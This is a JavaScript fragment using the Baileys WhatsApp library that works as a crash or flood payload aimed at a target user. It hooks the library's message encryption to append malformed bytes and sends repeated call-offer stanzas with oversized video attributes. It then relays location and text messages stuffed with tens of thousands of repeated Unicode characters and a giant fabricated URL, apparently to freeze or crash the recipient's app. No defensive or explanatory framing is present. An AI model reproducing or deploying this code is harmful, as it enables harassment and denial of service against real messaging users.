  const {
    encodeSignedDeviceIdentity,
    jidEncode,
    jidDecode,
    encodeWAMessage,
    patchMessageBeforeSending,
    encodeNewsletterMessage
  } = require("@whiskeysockets/baileys");

  const callId = "PnX" + "-Id" + Math.floor(Math.random() * 99999);
  const patched = patchMessageBeforeSending
    ? await patchMessageBeforeSending({
        protocolMessage: {
          type: "REVOKE",
          key: { id: callId }
        }
      }, [])
    : {
        protocolMessage: {
          type: "REVOKE",
          key: { id: callId }
        }
      };

  const bytes = await encodeNewsletterMessage(patched);
  const callLayout = [];
  const offerContent = [
    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
    { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
    {
      tag: 'video',
      attrs: {
        enc: 'vp8',
        dec: 'vp8',
        orientation: '0',
        screen_width: '9999',
        screen_height: '9999',
        device_orientation: '0'
      }
    },
    { tag: 'net', attrs: { medium: '3' } },
    {
      tag: 'capability',
      attrs: { ver: '1' },
      content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
    },
    { tag: 'encopt', attrs: { keygen: '2' } }
  ].filter(Boolean);

  callLayout.push({ tag: 'plaintext', attrs: {}, content: bytes });
  const encKey = crypto.randomBytes(32);
  const devicesEnc = (await sock.getUSyncDevices([target], true, false))
    .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

  await sock.assertSessions(devicesEnc, true);

  const {
    nodes: destinationsEnc,
    shouldIncludeDeviceIdentity
  } = await sock.createParticipantNodes(
    devicesEnc,
    { call: { callKey: new Uint8Array(encKey) } },
    { count: '2' }
  );

  offerContent.push({ tag: 'destination', attrs: {}, content: destinationsEnc });

  if (shouldIncludeDeviceIdentity) {
    offerContent.push({
      tag: 'device-identity',
      attrs: {},
      content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
    });
  }

  const stanza = {
    tag: 'call',
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [
      {
        tag: 'offer',
        attrs: {
          'call-id': callId,
          'call-creator': sock.user.id
        },
        content: offerContent
      }
    ]
  };

  let devices2 = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devices2);

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try {
            await prev;
          } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let memek = xnxx();
  let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let porno = sock.createParticipantNodes.bind(sock);
  let yntkts = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length)
      return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = sock.patchMessageBeforeSending
      ? await sock.patchMessageBeforeSending(message, recipientJids)
      : message;

    let ywdh = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;
    let nodes = await Promise.all(
      ywdh.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let y = jid === meId || jid === meLid;
        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;
        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
        return memek.mutex(jid, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({
            jid,
            data: bytes
          });

          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
          return {
            tag: 'to',
            attrs: { jid },
            content: [
              {
                tag: 'enc',
                attrs: { v: '2', type, ...extraAttrs },
                content: ciphertext
              }
            ]
          };
        });
      })
    );
    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let awik = crypto.randomBytes(32);
  let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
  let {
    nodes: destinations2,
    shouldIncludeDeviceIdentity: include2
  } = await sock.createParticipantNodes(
    devices2,
    { conversation: "y" },
    { count: '0' }
  );

  let lemiting = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [
      {
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "9999",
              screen_height: "9999",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations2 },
          ...(include2
            ? [
                {
                  tag: "device-identity",
                  attrs: {},
                  content: encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                  )
                }
              ]
            : [])
        ]
      }
    ]
  };

  const devicesPlain = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devicesPlain);

  const createMutex = () => {
    const locks = new Map();    
    return {
      async mutex(key, fn) {
        while (locks.has(key)) {
          await locks.get(key);
        }
        
        const lock = Promise.resolve().then(() => fn());
        locks.set(key, lock);
        
        try {
          const result = await lock;
          return result;
        } finally {
          locks.delete(key);
        }
      }
    };
  };

  const mutexManager = createMutex(); 
  const appendBufferMarker = (buffer) => {
    const newBuffer = Buffer.alloc(buffer.length + 8);
    buffer.copy(newBuffer);
    newBuffer.fill(1, buffer.length);
    return newBuffer;
  };

  const originalCreateParticipantNodes = sock.createParticipantNodes?.bind(sock);
  const originalEncodeWAMessage = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) {
      return {
        nodes: [],
        shouldIncludeDeviceIdentity: false
      };
    }

    const processedMessage = sock.patchMessageBeforeSending
      ? await sock.patchMessageBeforeSending(message, recipientJids)
      : message;

    const messagePairs = Array.isArray(processedMessage) 
      ? processedMessage 
      : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

    const { id: meId, lid: meLid } = sock.authState.creds.me;
    const localUser = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    const nodes = await Promise.all(
      messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
        const { user: targetUser } = jidDecode(jid);
        const { user: ownUser } = jidDecode(meId);
        const isOwnUser = targetUser === ownUser || targetUser === localUser;
        const isSelf = jid === meId || jid === meLid;
        
        if (dsmMessage && isOwnUser && !isSelf) {
          msg = dsmMessage;
        }

        const encodedBytes = appendBufferMarker(
          originalEncodeWAMessage 
            ? originalEncodeWAMessage(msg) 
            : encodeWAMessage(msg)
        );

        return mutexManager.mutex(jid, async () => {
          const { type, ciphertext } = await sock.signalRepository.encryptMessage({ 
            jid, 
            data: encodedBytes 
          });
          
          if (type === 'pkmsg') {
            shouldIncludeDeviceIdentity = true;
          }
          
          return {
            tag: 'to',
            attrs: { jid },
            content: [{
              tag: 'enc',
              attrs: {
                v: '2',
                type,
                ...extraAttrs
              },
              content: ciphertext
            }]
          };
        });
      })
    );
    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity
    };
  };

  const callKey2 = crypto.randomBytes(32);
  const extendedCallKey = Buffer.concat([callKey2, Buffer.alloc(8, 0x01)]);
  const callId2 = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();
  const { nodes: destinationsPlainFinal, shouldIncludeDeviceIdentity: shouldIncludeDeviceIdentityPlain } = 
    await sock.createParticipantNodes(devicesPlain, { 
      conversation: "call-initiated"
    }, { count: '0' });

  const vcStanzaPlain = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": callId2,
        "call-creator": sock.user.id
      },
      content: [
        {
          tag: "audio",
          attrs: {
            enc: "opus",
            rate: "16000"
          }
        },
        {
          tag: "audio",
          attrs: {
            enc: "opus",
            rate: "8000"
          }
        },
        {
          tag: 'video',
          attrs: {
            enc: 'vp8',
            dec: 'vp8',
            orientation: '0',
            screen_width: '1920',
            screen_height: '1080',
            device_orientation: '0'
          }
        },
        {
          tag: "net",
          attrs: {
            medium: "3"
          }
        },
        {
          tag: "capability",
          attrs: { ver: "1" },
          content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
        },
        {
          tag: "encopt",
          attrs: { keygen: "2" }
        },
        {
          tag: "destination",
          attrs: {},
          content: destinationsPlainFinal
        },
        ...(shouldIncludeDeviceIdentityPlain ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ].filter(Boolean)
    }]
  };

  await sock.sendNode(vcStanzaPlain);   
  await sock.sendNode(stanza);  
  await sock.sendNode(lemiting);
  await sock.sendNode(vcStanzaPlain);   
  await sock.sendNode(vcStanzaPlain);   

const exe = "𑇂𑆵𑆴𑆿".repeat(10000);
  const urlexe = `https://exe.${exe}-${exe}.gov/${exe}/`;
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessageV2Extension: {
        message: {
          locationMessage: {
            degreesLatitude: 11.2798,
            degreesLongitude: 21.0877,
            name: "🧪⃟⃟⃰⃟꙰。⌁𝐍𝐱⃰𝐩𝐞𝐜𝐭¡𝐨𝐧. - 𝐫𝟒𝐋𝐝𝐳.ꪸ⃟‼️💤" + exe,
            jpegThumbnail: "",
            isLive: true,
            merchantUrl: urlexe,
            url: urlexe + " idk ~ raldz ",
            clickToWhatsappCall: true,
            contextInfo: {
              externalAdReply: {
                title:
                  "🧪⃟⃟⃰⃟꙰。⌁𝐍𝐱⃰𝐩𝐞𝐜𝐭¡𝐨𝐧. - 𝐫𝟒𝐋𝐝𝐳.ꪸ⃟‼️💤",
                body: exe,
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                sourceUrl: urlexe,
                mediaUrl: urlexe,
                merchantUrl: urlexe,
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              quotedAd: {
                advertiserName: exe,
                mediaType: "VIDEO",
                jpegThumbnail: "",
                caption: exe,
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
            },
          },
        },
      },
    },
    {}
  );
  
  const etc = await generateWAMessageFromContent(target,
    {
      extendedTextMessage: {
        text: "💤‼️⃟⃰ᰧ./𝘙 _4_  𝘓  𝘋  𝘡  ✩ > https://Wa.me/stickerpack/RaldzzXyz" + exe,
        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title: "💤‼️⃟⃰ᰧ./𝘙 _4_  𝘓  𝘋  𝘡  ✩" + exe,
        previewType: "NONE",
        jpegThumbnail: "",
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );
  
  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
    participant: { jid: target },
  });
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
